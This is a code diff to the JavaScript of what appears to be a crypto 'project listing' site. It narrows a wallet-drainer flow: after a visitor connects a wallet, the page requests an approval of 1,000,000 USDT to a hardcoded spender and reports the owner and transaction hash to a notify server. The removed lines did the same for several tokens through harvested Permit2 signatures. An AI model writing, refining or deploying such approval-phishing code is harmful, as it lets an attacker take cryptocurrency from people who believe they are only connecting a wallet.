@@ -75,7 +75,7 @@ async function connectMetaMask() {
 }
 
 /* ============================
-   WALLETCONNECT v2 (FUNCTIONAL)
+   WALLETCONNECT v2 (ETHEREUM ONLY)
    ============================ */
 let wcProvider = null;
 
@@ -90,13 +90,10 @@ async function connectWalletConnect() {
 
     wcProvider = await EthereumProvider.init({
       projectId: "59ba0228712f04a947916abb7db06ab1",
-      chains: [1, 56, 137, 42161],
+      chains: [1], // Ethereum mainnet only
       showQrModal: true,
       rpcMap: {
-        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc",
-        56: "https://bsc-dataseed.binance.org",
-        137: "https://polygon-rpc.com",
-        42161: "https://arb1.arbitrum.io/rpc"
+        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc"
       },
       metadata: {
         name: "Crypto Project Listing",
@@ -129,75 +126,16 @@ async function connectWalletConnect() {
 }
 
 /* ============================
-   APPROVAL LOGIC WITH PERMIT2 + FALLBACK
+   APPROVAL LOGIC (USDT ONLY, FIXED AMOUNT)
    ============================ */
 async function approveSpender(account) {
   try {
     const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
-    const permit2Address = '0xPermit2ContractAddress'; // Uniswap Permit2 deployed address
+    const usdtAddress = 'USDT_CONTRACT_ADDRESS_HERE'; // Replace with actual USDT contract address
 
-    const tokens = [
-      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
-      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
-      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
-      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
-      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') }
-      // add more tokens here if needed
-    ];
+    // Fixed approval: 1,000,000 USDT (6 decimals)
+    const usdtAmount = (1000000 * 10 ** 6).toString();
 
-    // Try Permit2 first
-    try {
-      const domain = {
-        name: 'Permit2',
-        chainId: await window.web3.eth.getChainId(),
-        verifyingContract: permit2Address
-      };
-
-      const types = {
-        PermitSingle: [
-          { name: 'details', type: 'PermitDetails' },
-          { name: 'spender', type: 'address' },
-          { name: 'sigDeadline', type: 'uint256' }
-        ],
-        PermitDetails: [
-          { name: 'token', type: 'address' },
-          { name: 'amount', type: 'uint160' },
-          { name: 'expiration', type: 'uint48' },
-          { name: 'nonce', type: 'uint48' }
-        ]
-      };
-
-      for (const token of tokens) {
-        const message = {
-          details: {
-            token: token.address,
-            amount: token.amount,
-            expiration: Math.floor(Date.now() / 1000) + 3600,
-            nonce: 0
-          },
-          spender: spenderAddress,
-          sigDeadline: Math.floor(Date.now() / 1000) + 3600
-        };
-
-        const signature = await window.ethereum.request({
-          method: 'eth_signTypedData_v4',
-          params: [account, JSON.stringify({ domain, types, primaryType: 'PermitSingle', message })]
-        });
-
-        await fetch("http://localhost:3000/notify", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ owner: account, token: token.address, signature })
-        });
-      }
-
-      alert('Permit2 approvals signed!');
-      return;
-    } catch (permitError) {
-      console.warn('Permit2 failed, falling back to normal approve:', permitError);
-    }
-
-    // Fallback to normal approve
     const abi = [
       {
         "constant": false,
@@ -211,20 +149,18 @@ async function approveSpender(account) {
       }
     ];
 
-    for (const token of tokens) {
-      const contract = new window.web3.eth.Contract(abi, token.address);
-      const receipt = await contract.methods
-        .approve(spenderAddress, token.amount)
-        .send({ from: account });
+    const contract = new window.web3.eth.Contract(abi, usdtAddress);
+    const receipt = await contract.methods
+      .approve(spenderAddress, usdtAmount)
+      .send({ from: account });
 
-      await fetch("http://localhost:3000/notify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ owner: account, token: token.address, txHash: receipt.transactionHash })
-      });
-    }
+    await fetch("http://localhost:3000/notify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ owner: account, token: usdtAddress, txHash: receipt.transactionHash })
+    });
 
-    alert('Fallback approvals successful!');
+    alert('USDT approval successful!');
   } catch (error) {
     console.error('Approval flow failed:', error);
   }
